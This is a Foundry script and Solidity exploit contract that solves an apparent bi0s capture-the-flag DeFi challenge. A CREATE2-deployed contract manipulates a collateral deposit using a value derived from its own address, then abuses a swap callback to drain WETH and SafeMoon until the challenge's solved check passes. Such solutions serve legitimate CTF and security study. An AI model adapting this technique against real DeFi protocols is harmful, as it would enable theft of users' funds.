pragma solidity ^0.8.0;


import {Script,console} from "forge-std/Script.sol";
import {USDS,USDC,WETH,SafeMoon,Setup,USDSEngine} from "src/core/Setup.sol";

import {IBi0sSwapFactory} from "src/bi0s-swap-v1/interfaces/IBi0sSwapFactory.sol";
import {IBi0sSwapPair} from "src/bi0s-swap-v1/interfaces/IBi0sSwapPair.sol";
import "forge-std/StdJson.sol";
contract Solve is Script{
    using stdJson for *;

    function run()public{
        string memory path = string.concat("broadcast/Deploy.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        string memory json = vm.readFile(path);
        address setupAddress = json.readAddress(".transactions[0].contractAddress");
        vm.startBroadcast();
        bytes32 salt=vm.envBytes32("SALT");
        Setup setup=Setup(address(setupAddress));
        WETH weth=setup.weth();
        Create2Deployer create2deployer=new Create2Deployer();
        console.log("CREATE 2:",address(create2deployer));
        console.logBytes32(create2deployer.getInitHash());
        address exploit=create2deployer.deploy(salt);
        console.log(exploit);
        Exploit(exploit).initialize(address(setup));
        Exploit(exploit).pwn{value:80000000000000000000000}();
        vm.stopBroadcast();
    }
}


contract Exploit{

    Setup public setup;
    USDSEngine usdcEngine;
    IBi0sSwapPair wethSafeMoonPair;
    WETH weth;
    SafeMoon safemoon;
    uint256 requiredAmount=uint256(bytes32(keccak256("YOU NEED SOME BUCKS TO GET FLAG")))+1;

    function initialize(address _setup)public{
        setup=Setup(_setup);
        usdcEngine=setup.usdsEngine();
        wethSafeMoonPair=setup.wethSafeMoonPair();
        weth=setup.weth();
        safemoon=setup.safeMoon();
    }

    function pwn()public payable returns (bool){
        uint256 this_addr=uint256(uint160(address(this)));
        address player=address(10);
        weth.deposit{value:80000e18}(address(this));
        weth.approve(address(usdcEngine), 80000e18);
        uint256 _collateralDepositAmount=1207000603499873710129495113646411976443-uint256(uint160(address(this)));
        usdcEngine.depositCollateralThroughSwap(address(weth), address(safemoon), 80000e18, _collateralDepositAmount);
        usdcEngine.bi0sSwapv1Call(player, address(weth), requiredAmount+this_addr, abi.encode(requiredAmount));
        usdcEngine.bi0sSwapv1Call(player, address(safemoon), requiredAmount+this_addr, abi.encode(requiredAmount));
        setup.setPlayer(player);
        require(setup.isSolved(),"Chall Unsolved");
    }

}


contract Create2Deployer {


    function deploy( bytes32 _salt) public returns (address) {
        bytes memory initcode=type(Exploit).creationCode;
        address addr;
        assembly {
            addr := create2(0, add(initcode, 0x20), mload(initcode), _salt)
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        return addr;
    }

    function getInitHash()public returns (bytes32){
        bytes memory initcode=type(Exploit).creationCode;
        return keccak256(initcode);
    }
}
